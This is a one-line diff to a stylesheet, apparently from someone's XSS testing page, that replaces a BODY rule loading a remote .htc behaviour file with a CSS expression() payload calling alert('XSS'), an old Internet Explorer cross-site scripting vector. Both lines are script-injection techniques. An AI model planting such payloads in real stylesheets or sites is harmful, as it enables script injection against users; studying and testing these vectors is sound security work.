@@ -1,1 +1,1 @@
-BODY{behavior: url("https://github.com/HotTeaDrink/hotteadrink.github.io/edit/main/test.htc")!important;}
+BODY{width:expression(alert('XSS')) !important;}
